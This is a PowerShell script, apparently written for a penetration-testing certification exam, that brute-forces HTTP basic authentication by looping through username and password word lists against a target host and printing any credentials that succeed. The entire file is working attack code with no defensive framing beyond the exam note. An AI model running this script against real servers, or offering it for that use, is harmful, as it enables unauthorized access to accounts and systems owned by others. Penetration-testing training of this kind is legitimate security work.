function BruteForce-BasicAuth {

<#

.SYNOPSIS
PowerShell script to brute force basic authentication on a webserver.

.DESCRIPTION
The script iterates over a list of usernames and a list of passwords and displays progress.

.PARAMETER UserList
Specifies path to a line-by-line list of usernames. 

.PARAMETER PasswordList
Specifies path to a line-by-line list of passwords. 

.PARAMETER Protocol
Default protocol is set to http

.PARAMETER Hostname
The target hostname (ex. targethost.com) 

.PARAMETER Port
Default port is 80.

.PARAMETER Filename
Optional filename on the webserver. Could also be a directory (ex: admin/console)

.EXAMPLE
BruteForce-BasicAuth -UsernameList .\usernames.txt -PasswordList .\passwords.txt -Hostname 127.0.0.1 -Filename Stuff.txt

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-xxxx

#>




    Param (
        
        #A line-by-line list of usernames
        [Parameter(Mandatory = $true)]
        [String]
        $UsernameList,
    
        #A line-by-line list of passwords
        [Parameter(Mandatory = $true)]
        [String]
        $PasswordList,
            
        [Parameter(Mandatory = $true)] 
        [ValidateSet("http","https")]
        [String]
        $Protocol = "http",        
    
        [Parameter(Mandatory = $true)]
        [String]
        $Hostname,
    
        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [Int]
        $Port = "80",
    
        [Parameter(Mandatory = $false)] 
        [String]
        $Filename
        )
    
    # Get usernames and passwords from file
    $Usernames = Get-Content $UsernameList
    $Passwords = Get-Content $PasswordList
    
    # Count number of combinations
    [int]$Combinations = ($Usernames.Length * $Passwords.Length)
    
    [int]$Current = 0
    
    # Sets targetURL
    $Targeturl = $Protocol + "://" + $Hostname + ":" + $Port + "/" + $Filename
    
    # Print number of combinations
    Write-Host "Number of user/pass combinations found: " $Combinations
    Write-Host "Bruteforcing $Targeturl...`n"
    #Loop through usernames first and passwords second
    
        foreach($Username in $Usernames) {
            
            foreach($Password in $Passwords) {
                   
                $Webclient = New-Object Net.WebClient
            
                $SecureStringPass = ConvertTo-SecureString -AsPlainText -String $Password -Force
                $Credentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecureStringPass
                $Webclient.Credentials = $Credentials
                $Current++
                Write-Progress -Activity "Bruteforcing..." -Status "Status" -CurrentOperation "Trying $Current of $Combinations" -PercentComplete ($Current/$Combinations*100)
                try {
                    
                    $connect = $Webclient.OpenRead($Targeturl)
                    $Success = $true
    
                        if ($Success -eq $true) {
                            [System.Media.SystemSounds]::Asterisk.play()
                            Write-Host "A match was found! `n" -ForegroundColor Green
                            Write-Host "Username: $Username`n" -ForegroundColor Magenta
                            Write-Host "Password: $Password`n" -ForegroundColor Magenta
                            }
                    }
                             
                catch {
    
                            $Sucess = $false
                                                   
                      }
                    
                }
    
        }
    }
